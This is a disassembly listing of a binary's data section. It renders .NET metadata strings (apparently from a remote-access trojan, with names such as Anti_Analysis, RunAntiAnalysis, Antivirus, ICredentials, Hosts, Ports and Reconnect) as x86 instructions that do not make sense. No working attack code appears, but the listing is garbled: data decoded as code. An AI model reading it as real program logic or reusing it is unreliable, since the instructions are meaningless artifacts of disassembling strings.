  408c95:	72 00                	jb     0x408c97
  408c97:	54                   	push   %esp
  408c98:	65 78 74             	gs js  0x408d0f
  408c9b:	57                   	push   %edi
  408c9c:	72 69                	jb     0x408d07
  408c9e:	74 65                	je     0x408d05
  408ca0:	72 00                	jb     0x408ca2
  408ca2:	45                   	inc    %ebp
  408ca3:	6e                   	outsb  %ds:(%esi),(%dx)
  408ca4:	74 65                	je     0x408d0b
  408ca6:	72 00                	jb     0x408ca8
  408ca8:	42                   	inc    %edx
  408ca9:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  408cb0:	72 
  408cb1:	74 65                	je     0x408d18
  408cb3:	72 00                	jb     0x408cb5
  408cb5:	54                   	push   %esp
  408cb6:	6f                   	outsl  %ds:(%esi),(%dx)
  408cb7:	4c                   	dec    %esp
  408cb8:	6f                   	outsl  %ds:(%esi),(%dx)
  408cb9:	77 65                	ja     0x408d20
  408cbb:	72 00                	jb     0x408cbd
  408cbd:	45                   	inc    %ebp
  408cbe:	72 72                	jb     0x408d32
  408cc0:	6f                   	outsl  %ds:(%esi),(%dx)
  408cc1:	72 00                	jb     0x408cc3
  408cc3:	49                   	dec    %ecx
  408cc4:	45                   	inc    %ebp
  408cc5:	6e                   	outsb  %ds:(%esi),(%dx)
  408cc6:	75 6d                	jne    0x408d35
  408cc8:	65 72 61             	gs jb  0x408d2c
  408ccb:	74 6f                	je     0x408d3c
  408ccd:	72 00                	jb     0x408ccf
  408ccf:	4d                   	dec    %ebp
  408cd0:	61                   	popa
  408cd1:	6e                   	outsb  %ds:(%esi),(%dx)
  408cd2:	61                   	popa
  408cd3:	67 65 6d             	gs insl (%dx),%es:(%di)
  408cd6:	65 6e                	outsb  %gs:(%esi),(%dx)
  408cd8:	74 4f                	je     0x408d29
  408cda:	62 6a 65             	bound  %ebp,0x65(%edx)
  408cdd:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  408ce1:	75 6d                	jne    0x408d50
  408ce3:	65 72 61             	gs jb  0x408d47
  408ce6:	74 6f                	je     0x408d57
  408ce8:	72 00                	jb     0x408cea
  408cea:	53                   	push   %ebx
  408ceb:	79 73                	jns    0x408d60
  408ced:	74 65                	je     0x408d54
  408cef:	6d                   	insl   (%dx),%es:(%edi)
  408cf0:	2e 43                	cs inc %ebx
  408cf2:	6f                   	outsl  %ds:(%esi),(%dx)
  408cf3:	6c                   	insb   (%dx),%es:(%edi)
  408cf4:	6c                   	insb   (%dx),%es:(%edi)
  408cf5:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408cfa:	6e                   	outsb  %ds:(%esi),(%dx)
  408cfb:	73 2e                	jae    0x408d2b
  408cfd:	49                   	dec    %ecx
  408cfe:	45                   	inc    %ebp
  408cff:	6e                   	outsb  %ds:(%esi),(%dx)
  408d00:	75 6d                	jne    0x408d6f
  408d02:	65 72 61             	gs jb  0x408d66
  408d05:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  408d09:	47                   	inc    %edi
  408d0a:	65 74 45             	gs je  0x408d52
  408d0d:	6e                   	outsb  %ds:(%esi),(%dx)
  408d0e:	75 6d                	jne    0x408d7d
  408d10:	65 72 61             	gs jb  0x408d74
  408d13:	74 6f                	je     0x408d84
  408d15:	72 00                	jb     0x408d17
  408d17:	41                   	inc    %ecx
  408d18:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d1c:	61                   	popa
  408d1d:	74 6f                	je     0x408d8e
  408d1f:	72 00                	jb     0x408d21
  408d21:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  408d26:	00 2e                	add    %ch,(%esi)
  408d28:	63 63 74             	arpl   %esp,0x74(%ebx)
  408d2b:	6f                   	outsl  %ds:(%esi),(%dx)
  408d2c:	72 00                	jb     0x408d2e
  408d2e:	4d                   	dec    %ebp
  408d2f:	6f                   	outsl  %ds:(%esi),(%dx)
  408d30:	6e                   	outsb  %ds:(%esi),(%dx)
  408d31:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  408d38:	65 
  408d39:	61                   	popa
  408d3a:	74 65                	je     0x408da1
  408d3c:	44                   	inc    %esp
  408d3d:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  408d41:	70 74                	jo     0x408db7
  408d43:	6f                   	outsl  %ds:(%esi),(%dx)
  408d44:	72 00                	jb     0x408d46
  408d46:	43                   	inc    %ebx
  408d47:	72 65                	jb     0x408dae
  408d49:	61                   	popa
  408d4a:	74 65                	je     0x408db1
  408d4c:	45                   	inc    %ebp
  408d4d:	6e                   	outsb  %ds:(%esi),(%dx)
  408d4e:	63 72 79             	arpl   %esi,0x79(%edx)
  408d51:	70 74                	jo     0x408dc7
  408d53:	6f                   	outsl  %ds:(%esi),(%dx)
  408d54:	72 00                	jb     0x408d56
  408d56:	49                   	dec    %ecx
  408d57:	6e                   	outsb  %ds:(%esi),(%dx)
  408d58:	74 50                	je     0x408daa
  408d5a:	74 72                	je     0x408dce
  408d5c:	00 53 79             	add    %dl,0x79(%ebx)
  408d5f:	73 74                	jae    0x408dd5
  408d61:	65 6d                	gs insl (%dx),%es:(%edi)
  408d63:	2e 44                	cs inc %esp
  408d65:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  408d6c:	69 63 73 00 4e 61 74 	imul   $0x74614e00,0x73(%ebx),%esp
  408d73:	69 76 65 4d 65 74 68 	imul   $0x6874654d,0x65(%esi),%esi
  408d7a:	6f                   	outsl  %ds:(%esi),(%dx)
  408d7b:	64 73 00             	fs jae 0x408d7e
  408d7e:	4d                   	dec    %ebp
  408d7f:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408d86:	74 2e                	je     0x408db6
  408d88:	56                   	push   %esi
  408d89:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408d90:	73 69                	jae    0x408dfb
  408d92:	63 2e                	arpl   %ebp,(%esi)
  408d94:	44                   	inc    %esp
  408d95:	65 76 69             	gs jbe 0x408e01
  408d98:	63 65 73             	arpl   %esp,0x73(%ebp)
  408d9b:	00 53 79             	add    %dl,0x79(%ebx)
  408d9e:	73 74                	jae    0x408e14
  408da0:	65 6d                	gs insl (%dx),%es:(%edi)
  408da2:	2e 52                	cs push %edx
  408da4:	75 6e                	jne    0x408e14
  408da6:	74 69                	je     0x408e11
  408da8:	6d                   	insl   (%dx),%es:(%edi)
  408da9:	65 2e 49             	gs cs dec %ecx
  408dac:	6e                   	outsb  %ds:(%esi),(%dx)
  408dad:	74 65                	je     0x408e14
  408daf:	72 6f                	jb     0x408e20
  408db1:	70 53                	jo     0x408e06
  408db3:	65 72 76             	gs jb  0x408e2c
  408db6:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  408dbd:	73 74                	jae    0x408e33
  408dbf:	65 6d                	gs insl (%dx),%es:(%edi)
  408dc1:	2e 52                	cs push %edx
  408dc3:	75 6e                	jne    0x408e33
  408dc5:	74 69                	je     0x408e30
  408dc7:	6d                   	insl   (%dx),%es:(%edi)
  408dc8:	65 2e 43             	gs cs inc %ebx
  408dcb:	6f                   	outsl  %ds:(%esi),(%dx)
  408dcc:	6d                   	insl   (%dx),%es:(%edi)
  408dcd:	70 69                	jo     0x408e38
  408dcf:	6c                   	insb   (%dx),%es:(%edi)
  408dd0:	65 72 53             	gs jb  0x408e26
  408dd3:	65 72 76             	gs jb  0x408e4c
  408dd6:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  408ddd:	62 75 67             	bound  %esi,0x67(%ebp)
  408de0:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  408de7:	65 
  408de8:	73 00                	jae    0x408dea
  408dea:	45                   	inc    %ebp
  408deb:	78 70                	js     0x408e5d
  408ded:	61                   	popa
  408dee:	6e                   	outsb  %ds:(%esi),(%dx)
  408def:	64 45                	fs inc %ebp
  408df1:	6e                   	outsb  %ds:(%esi),(%dx)
  408df2:	76 69                	jbe    0x408e5d
  408df4:	72 6f                	jb     0x408e65
  408df6:	6e                   	outsb  %ds:(%esi),(%dx)
  408df7:	6d                   	insl   (%dx),%es:(%edi)
  408df8:	65 6e                	outsb  %gs:(%esi),(%dx)
  408dfa:	74 56                	je     0x408e52
  408dfc:	61                   	popa
  408dfd:	72 69                	jb     0x408e68
  408dff:	61                   	popa
  408e00:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  408e04:	00 47 65             	add    %al,0x65(%edi)
  408e07:	74 50                	je     0x408e59
  408e09:	72 6f                	jb     0x408e7a
  408e0b:	63 65 73             	arpl   %esp,0x73(%ebp)
  408e0e:	73 65                	jae    0x408e75
  408e10:	73 00                	jae    0x408e12
  408e12:	47                   	inc    %edi
  408e13:	65 74 48             	gs je  0x408e5e
  408e16:	6f                   	outsl  %ds:(%esi),(%dx)
  408e17:	73 74                	jae    0x408e8d
  408e19:	41                   	inc    %ecx
  408e1a:	64 64 72 65          	fs fs jb 0x408e83
  408e1e:	73 73                	jae    0x408e93
  408e20:	65 73 00             	gs jae 0x408e23
  408e23:	53                   	push   %ebx
  408e24:	79 73                	jns    0x408e99
  408e26:	74 65                	je     0x408e8d
  408e28:	6d                   	insl   (%dx),%es:(%edi)
  408e29:	2e 53                	cs push %ebx
  408e2b:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408e2f:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  408e36:	70 
  408e37:	74 6f                	je     0x408ea8
  408e39:	67 72 61             	addr16 jb 0x408e9d
  408e3c:	70 68                	jo     0x408ea6
  408e3e:	79 2e                	jns    0x408e6e
  408e40:	58                   	pop    %eax
  408e41:	35 30 39 43 65       	xor    $0x65433930,%eax
  408e46:	72 74                	jb     0x408ebc
  408e48:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e4f:	73 00                	jae    0x408e51
  408e51:	45                   	inc    %ebp
  408e52:	6e                   	outsb  %ds:(%esi),(%dx)
  408e53:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408e56:	65 32 42 79          	xor    %gs:0x79(%edx),%al
  408e5a:	74 65                	je     0x408ec1
  408e5c:	73 00                	jae    0x408e5e
  408e5e:	47                   	inc    %edi
  408e5f:	65 74 55             	gs je  0x408eb7
  408e62:	74 66                	je     0x408eca
  408e64:	38 42 79             	cmp    %al,0x79(%edx)
  408e67:	74 65                	je     0x408ece
  408e69:	73 00                	jae    0x408e6b
  408e6b:	75 74                	jne    0x408ee1
  408e6d:	66 38 42 79          	data16 cmp %al,0x79(%edx)
  408e71:	74 65                	je     0x408ed8
  408e73:	73 00                	jae    0x408e75
  408e75:	52                   	push   %edx
  408e76:	66 63 32             	arpl   %si,(%edx)
  408e79:	38 39                	cmp    %bh,(%ecx)
  408e7b:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  408e7f:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  408e86:	73 00                	jae    0x408e88
  408e88:	52                   	push   %edx
  408e89:	65 61                	gs popa
  408e8b:	64 41                	fs inc %ecx
  408e8d:	6c                   	insb   (%dx),%es:(%edi)
  408e8e:	6c                   	insb   (%dx),%es:(%edi)
  408e8f:	42                   	inc    %edx
  408e90:	79 74                	jns    0x408f06
  408e92:	65 73 00             	gs jae 0x408e95
  408e95:	44                   	inc    %esp
  408e96:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  408e9a:	65 46                	gs inc %esi
  408e9c:	72 6f                	jb     0x408f0d
  408e9e:	6d                   	insl   (%dx),%es:(%edi)
  408e9f:	42                   	inc    %edx
  408ea0:	79 74                	jns    0x408f16
  408ea2:	65 73 00             	gs jae 0x408ea5
  408ea5:	53                   	push   %ebx
  408ea6:	77 61                	ja     0x408f09
  408ea8:	70 42                	jo     0x408eec
  408eaa:	79 74                	jns    0x408f20
  408eac:	65 73 00             	gs jae 0x408eaf
  408eaf:	4c                   	dec    %esp
  408eb0:	6f                   	outsl  %ds:(%esi),(%dx)
  408eb1:	61                   	popa
  408eb2:	64 46                	fs inc %esi
  408eb4:	69 6c 65 41 73 42 79 	imul   $0x74794273,0x41(%ebp,%eiz,2),%ebp
  408ebb:	74 
  408ebc:	65 73 00             	gs jae 0x408ebf
  408ebf:	47                   	inc    %edi
  408ec0:	65 74 41             	gs je  0x408f04
  408ec3:	73 42                	jae    0x408f07
  408ec5:	79 74                	jns    0x408f3b
  408ec7:	65 73 00             	gs jae 0x408eca
  408eca:	53                   	push   %ebx
  408ecb:	65 74 41             	gs je  0x408f0f
  408ece:	73 42                	jae    0x408f12
  408ed0:	79 74                	jns    0x408f46
  408ed2:	65 73 00             	gs jae 0x408ed5
  408ed5:	47                   	inc    %edi
  408ed6:	65 74 42             	gs je  0x408f1b
  408ed9:	79 74                	jns    0x408f4f
  408edb:	65 73 00             	gs jae 0x408ede
  408ede:	72 61                	jb     0x408f41
  408ee0:	77 42                	ja     0x408f24
  408ee2:	79 74                	jns    0x408f58
  408ee4:	65 73 00             	gs jae 0x408ee7
  408ee7:	62 79 74             	bound  %edi,0x74(%ecx)
  408eea:	65 73 00             	gs jae 0x408eed
  408eed:	43                   	inc    %ebx
  408eee:	53                   	push   %ebx
  408eef:	68 61 72 70 41       	push   $0x41707261
  408ef4:	72 67                	jb     0x408f5d
  408ef6:	75 6d                	jne    0x408f65
  408ef8:	65 6e                	outsb  %gs:(%esi),(%dx)
  408efa:	74 49                	je     0x408f45
  408efc:	6e                   	outsb  %ds:(%esi),(%dx)
  408efd:	66 6f                	outsw  %ds:(%esi),(%dx)
  408eff:	46                   	inc    %esi
  408f00:	6c                   	insb   (%dx),%es:(%edi)
  408f01:	61                   	popa
  408f02:	67 73 00             	addr16 jae 0x408f05
  408f05:	43                   	inc    %ebx
  408f06:	53                   	push   %ebx
  408f07:	68 61 72 70 42       	push   $0x42707261
  408f0c:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  408f13:	61                   	popa
  408f14:	67 73 00             	addr16 jae 0x408f17
  408f17:	65 73 46             	gs jae 0x408f60
  408f1a:	6c                   	insb   (%dx),%es:(%edi)
  408f1b:	61                   	popa
  408f1c:	67 73 00             	addr16 jae 0x408f1f
  408f1f:	53                   	push   %ebx
  408f20:	74 72                	je     0x408f94
  408f22:	69 6e 67 73 00 49 6e 	imul   $0x6e490073,0x67(%esi),%ebp
  408f29:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  408f30:	65 
  408f31:	53                   	push   %ebx
  408f32:	65 74 74             	gs je  0x408fa9
  408f35:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  408f3c:	73 73                	jae    0x408fb1
  408f3e:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408f45:	6e                   	outsb  %ds:(%esi),(%dx)
  408f46:	67 45                	addr16 inc %ebp
  408f48:	76 65                	jbe    0x408faf
  408f4a:	6e                   	outsb  %ds:(%esi),(%dx)
  408f4b:	74 41                	je     0x408f8e
  408f4d:	72 67                	jb     0x408fb6
  408f4f:	73 00                	jae    0x408f51
  408f51:	41                   	inc    %ecx
  408f52:	6e                   	outsb  %ds:(%esi),(%dx)
  408f53:	74 69                	je     0x408fbe
  408f55:	5f                   	pop    %edi
  408f56:	41                   	inc    %ecx
  408f57:	6e                   	outsb  %ds:(%esi),(%dx)
  408f58:	61                   	popa
  408f59:	6c                   	insb   (%dx),%es:(%edi)
  408f5a:	79 73                	jns    0x408fcf
  408f5c:	69 73 00 52 75 6e 41 	imul   $0x416e7552,0x0(%ebx),%esi
  408f63:	6e                   	outsb  %ds:(%esi),(%dx)
  408f64:	74 69                	je     0x408fcf
  408f66:	41                   	inc    %ecx
  408f67:	6e                   	outsb  %ds:(%esi),(%dx)
  408f68:	61                   	popa
  408f69:	6c                   	insb   (%dx),%es:(%edi)
  408f6a:	79 73                	jns    0x408fdf
  408f6c:	69 73 00 50 61 63 6b 	imul   $0x6b636150,0x0(%ebx),%esi
  408f73:	73 00                	jae    0x408f75
  408f75:	49                   	dec    %ecx
  408f76:	43                   	inc    %ebx
  408f77:	72 65                	jb     0x408fde
  408f79:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f7c:	74 69                	je     0x408fe7
  408f7e:	61                   	popa
  408f7f:	6c                   	insb   (%dx),%es:(%edi)
  408f80:	73 00                	jae    0x408f82
  408f82:	73 65                	jae    0x408fe9
  408f84:	74 5f                	je     0x408fe5
  408f86:	43                   	inc    %ebx
  408f87:	72 65                	jb     0x408fee
  408f89:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f8c:	74 69                	je     0x408ff7
  408f8e:	61                   	popa
  408f8f:	6c                   	insb   (%dx),%es:(%edi)
  408f90:	73 00                	jae    0x408f92
  408f92:	45                   	inc    %ebp
  408f93:	71 75                	jno    0x40900a
  408f95:	61                   	popa
  408f96:	6c                   	insb   (%dx),%es:(%edi)
  408f97:	73 00                	jae    0x408f99
  408f99:	53                   	push   %ebx
  408f9a:	73 6c                	jae    0x409008
  408f9c:	50                   	push   %eax
  408f9d:	72 6f                	jb     0x40900e
  408f9f:	74 6f                	je     0x409010
  408fa1:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408fa4:	73 00                	jae    0x408fa6
  408fa6:	52                   	push   %edx
  408fa7:	65 61                	gs popa
  408fa9:	64 54                	fs push %esp
  408fab:	6f                   	outsl  %ds:(%esi),(%dx)
  408fac:	6f                   	outsl  %ds:(%esi),(%dx)
  408fad:	6c                   	insb   (%dx),%es:(%edi)
  408fae:	73 00                	jae    0x408fb0
  408fb0:	57                   	push   %edi
  408fb1:	72 69                	jb     0x40901c
  408fb3:	74 65                	je     0x40901a
  408fb5:	54                   	push   %esp
  408fb6:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb7:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb8:	6c                   	insb   (%dx),%es:(%edi)
  408fb9:	73 00                	jae    0x408fbb
  408fbb:	42                   	inc    %edx
  408fbc:	79 74                	jns    0x409032
  408fbe:	65 73 54             	gs jae 0x409015
  408fc1:	6f                   	outsl  %ds:(%esi),(%dx)
  408fc2:	6f                   	outsl  %ds:(%esi),(%dx)
  408fc3:	6c                   	insb   (%dx),%es:(%edi)
  408fc4:	73 00                	jae    0x408fc6
  408fc6:	53                   	push   %ebx
  408fc7:	79 73                	jns    0x40903c
  408fc9:	74 65                	je     0x409030
  408fcb:	6d                   	insl   (%dx),%es:(%edi)
  408fcc:	2e 57                	cs push %edi
  408fce:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  408fd5:	46                   	inc    %esi
  408fd6:	6f                   	outsl  %ds:(%esi),(%dx)
  408fd7:	72 6d                	jb     0x409046
  408fd9:	73 00                	jae    0x408fdb
  408fdb:	44                   	inc    %esp
  408fdc:	6e                   	outsb  %ds:(%esi),(%dx)
  408fdd:	73 00                	jae    0x408fdf
  408fdf:	43                   	inc    %ebx
  408fe0:	6f                   	outsl  %ds:(%esi),(%dx)
  408fe1:	6e                   	outsb  %ds:(%esi),(%dx)
  408fe2:	74 61                	je     0x409045
  408fe4:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  408feb:	74 65                	je     0x409052
  408fed:	6d                   	insl   (%dx),%es:(%edi)
  408fee:	2e 43                	cs inc %ebx
  408ff0:	6f                   	outsl  %ds:(%esi),(%dx)
  408ff1:	6c                   	insb   (%dx),%es:(%edi)
  408ff2:	6c                   	insb   (%dx),%es:(%edi)
  408ff3:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408ff8:	6e                   	outsb  %ds:(%esi),(%dx)
  408ff9:	73 00                	jae    0x408ffb
  408ffb:	53                   	push   %ebx
  408ffc:	74 72                	je     0x409070
  408ffe:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  409005:	74 4f                	je     0x409056
  409007:	70 74                	jo     0x40907d
  409009:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  409010:	74 49                	je     0x40905b
  409012:	6d                   	insl   (%dx),%es:(%edi)
  409013:	61                   	popa
  409014:	67 65 44             	addr16 gs inc %esp
  409017:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  40901b:	65 72 73             	gs jb  0x409091
  40901e:	00 52 75             	add    %dl,0x75(%edx)
  409021:	6e                   	outsb  %ds:(%esi),(%dx)
  409022:	74 69                	je     0x40908d
  409024:	6d                   	insl   (%dx),%es:(%edi)
  409025:	65 48                	gs dec %eax
  409027:	65 6c                	gs insb (%dx),%es:(%edi)
  409029:	70 65                	jo     0x409090
  40902b:	72 73                	jb     0x4090a0
  40902d:	00 53 73             	add    %dl,0x73(%ebx)
  409030:	6c                   	insb   (%dx),%es:(%edi)
  409031:	50                   	push   %eax
  409032:	6f                   	outsl  %ds:(%esi),(%dx)
  409033:	6c                   	insb   (%dx),%es:(%edi)
  409034:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  40903b:	72 73                	jb     0x4090b0
  40903d:	00 73 73             	add    %dh,0x73(%ebx)
  409040:	6c                   	insb   (%dx),%es:(%edi)
  409041:	50                   	push   %eax
  409042:	6f                   	outsl  %ds:(%esi),(%dx)
  409043:	6c                   	insb   (%dx),%es:(%edi)
  409044:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  40904b:	72 73                	jb     0x4090c0
  40904d:	00 46 69             	add    %al,0x69(%esi)
  409050:	6c                   	insb   (%dx),%es:(%edi)
  409051:	65 41                	gs inc %ecx
  409053:	63 63 65             	arpl   %esp,0x65(%ebx)
  409056:	73 73                	jae    0x4090cb
  409058:	00 68 50             	add    %ch,0x50(%eax)
  40905b:	72 6f                	jb     0x4090cc
  40905d:	63 65 73             	arpl   %esp,0x73(%ebp)
  409060:	73 00                	jae    0x409062
  409062:	47                   	inc    %edi
  409063:	65 74 43             	gs je  0x4090a9
  409066:	75 72                	jne    0x4090da
  409068:	72 65                	jb     0x4090cf
  40906a:	6e                   	outsb  %ds:(%esi),(%dx)
  40906b:	74 50                	je     0x4090bd
  40906d:	72 6f                	jb     0x4090de
  40906f:	63 65 73             	arpl   %esp,0x73(%ebp)
  409072:	73 00                	jae    0x409074
  409074:	49                   	dec    %ecx
  409075:	50                   	push   %eax
  409076:	41                   	inc    %ecx
  409077:	64 64 72 65          	fs fs jb 0x4090e0
  40907b:	73 73                	jae    0x4090f0
  40907d:	00 43 6f             	add    %al,0x6f(%ebx)
  409080:	6d                   	insl   (%dx),%es:(%edi)
  409081:	70 72                	jo     0x4090f5
  409083:	65 73 73             	gs jae 0x4090f9
  409086:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  40908a:	6f                   	outsl  %ds:(%esi),(%dx)
  40908b:	6d                   	insl   (%dx),%es:(%edi)
  40908c:	70 72                	jo     0x409100
  40908e:	65 73 73             	gs jae 0x409104
  409091:	00 53 79             	add    %dl,0x79(%ebx)
  409094:	73 74                	jae    0x40910a
  409096:	65 6d                	gs insl (%dx),%es:(%edi)
  409098:	2e 4e                	cs dec %esi
  40909a:	65 74 2e             	gs je  0x4090cb
  40909d:	53                   	push   %ebx
  40909e:	6f                   	outsl  %ds:(%esi),(%dx)
  40909f:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4090a2:	74 73                	je     0x409117
  4090a4:	00 73 65             	add    %dh,0x65(%ebx)
  4090a7:	74 5f                	je     0x409108
  4090a9:	41                   	inc    %ecx
  4090aa:	72 67                	jb     0x409113
  4090ac:	75 6d                	jne    0x40911b
  4090ae:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090b0:	74 73                	je     0x409125
  4090b2:	00 53 79             	add    %dl,0x79(%ebx)
  4090b5:	73 74                	jae    0x40912b
  4090b7:	65 6d                	gs insl (%dx),%es:(%edi)
  4090b9:	45                   	inc    %ebp
  4090ba:	76 65                	jbe    0x409121
  4090bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4090bd:	74 73                	je     0x409132
  4090bf:	00 50 6f             	add    %dl,0x6f(%eax)
  4090c2:	72 74                	jb     0x409138
  4090c4:	73 00                	jae    0x4090c6
  4090c6:	45                   	inc    %ebp
  4090c7:	78 69                	js     0x409132
  4090c9:	73 74                	jae    0x40913f
  4090cb:	73 00                	jae    0x4090cd
  4090cd:	48                   	dec    %eax
  4090ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4090cf:	73 74                	jae    0x409145
  4090d1:	73 00                	jae    0x4090d3
  4090d3:	41                   	inc    %ecx
  4090d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4090d5:	74 69                	je     0x409140
  4090d7:	76 69                	jbe    0x409142
  4090d9:	72 75                	jb     0x409150
  4090db:	73 00                	jae    0x4090dd
  4090dd:	43                   	inc    %ebx
  4090de:	6f                   	outsl  %ds:(%esi),(%dx)
  4090df:	6e                   	outsb  %ds:(%esi),(%dx)
  4090e0:	63 61 74             	arpl   %esp,0x74(%ecx)
  4090e3:	00 49 6d             	add    %cl,0x6d(%ecx)
  4090e6:	61                   	popa
  4090e7:	67 65 46             	addr16 gs inc %esi
  4090ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4090eb:	72 6d                	jb     0x40915a
  4090ed:	61                   	popa
  4090ee:	74 00                	je     0x4090f0
  4090f0:	66 6f                	outsw  %ds:(%esi),(%dx)
  4090f2:	72 6d                	jb     0x409161
  4090f4:	61                   	popa
  4090f5:	74 00                	je     0x4090f7
  4090f7:	57                   	push   %edi
  4090f8:	72 69                	jb     0x409163
  4090fa:	74 65                	je     0x409161
  4090fc:	46                   	inc    %esi
  4090fd:	6c                   	insb   (%dx),%es:(%edi)
  4090fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4090ff:	61                   	popa
  409100:	74 00                	je     0x409102
  409102:	67 65 74 5f          	addr16 gs je 0x409165
  409106:	41                   	inc    %ecx
  409107:	73 46                	jae    0x40914f
  409109:	6c                   	insb   (%dx),%es:(%edi)
  40910a:	6f                   	outsl  %ds:(%esi),(%dx)
  40910b:	61                   	popa
  40910c:	74 00                	je     0x40910e
  40910e:	73 65                	jae    0x409175
  409110:	74 5f                	je     0x409171
  409112:	41                   	inc    %ecx
  409113:	73 46                	jae    0x40915b
  409115:	6c                   	insb   (%dx),%es:(%edi)
  409116:	6f                   	outsl  %ds:(%esi),(%dx)
  409117:	61                   	popa
  409118:	74 00                	je     0x40911a
  40911a:	47                   	inc    %edi
  40911b:	65 74 41             	gs je  0x40915f
  40911e:	73 46                	jae    0x409166
  409120:	6c                   	insb   (%dx),%es:(%edi)
  409121:	6f                   	outsl  %ds:(%esi),(%dx)
  409122:	61                   	popa
  409123:	74 00                	je     0x409125
  409125:	53                   	push   %ebx
  409126:	65 74 41             	gs je  0x40916a
  409129:	73 46                	jae    0x409171
  40912b:	6c                   	insb   (%dx),%es:(%edi)
  40912c:	6f                   	outsl  %ds:(%esi),(%dx)
  40912d:	61                   	popa
  40912e:	74 00                	je     0x409130
  409130:	46                   	inc    %esi
  409131:	69 6e 64 4f 62 6a 65 	imul   $0x656a624f,0x64(%esi),%ebp
  409138:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  40913c:	61                   	popa
  40913d:	6e                   	outsb  %ds:(%esi),(%dx)
  40913e:	61                   	popa
  40913f:	67 65 6d             	gs insl (%dx),%es:(%di)
  409142:	65 6e                	outsb  %gs:(%esi),(%dx)
  409144:	74 42                	je     0x409188
  409146:	61                   	popa
  409147:	73 65                	jae    0x4091ae
  409149:	4f                   	dec    %edi
  40914a:	62 6a 65             	bound  %ebp,0x65(%edx)
  40914d:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  409151:	6f                   	outsl  %ds:(%esi),(%dx)
  409152:	72 63                	jb     0x4091b7
  409154:	65 50                	gs push %eax
  409156:	61                   	popa
  409157:	74 68                	je     0x4091c1
  409159:	4f                   	dec    %edi
  40915a:	62 6a 65             	bound  %ebp,0x65(%edx)
  40915d:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  409161:	6f                   	outsl  %ds:(%esi),(%dx)
  409162:	6c                   	insb   (%dx),%es:(%edi)
  409163:	6c                   	insb   (%dx),%es:(%edi)
  409164:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  409169:	6f                   	outsl  %ds:(%esi),(%dx)
  40916a:	6e                   	outsb  %ds:(%esi),(%dx)
  40916b:	6e                   	outsb  %ds:(%esi),(%dx)
  40916c:	65 63 74 00 52       	arpl   %esi,%gs:0x52(%eax,%eax,1)
  409171:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  409175:	6e                   	outsb  %ds:(%esi),(%dx)
  409176:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  40917b:	65 74 00             	gs je  0x40917e
  40917e:	53                   	push   %ebx
  40917f:	79 73                	jns    0x4091f4
  409181:	74 65                	je     0x4091e8
  409183:	6d                   	insl   (%dx),%es:(%edi)
  409184:	2e 4e                	cs dec %esi
  409186:	65 74 00             	gs je  0x409189
  409189:	53                   	push   %ebx
  40918a:	65 74 00             	gs je  0x40918d
  40918d:	54                   	push   %esp
  40918e:	61                   	popa
  40918f:	72 67                	jb     0x4091f8
  409191:	65 74 00             	gs je  0x409194
  409194:	43                   	inc    %ebx
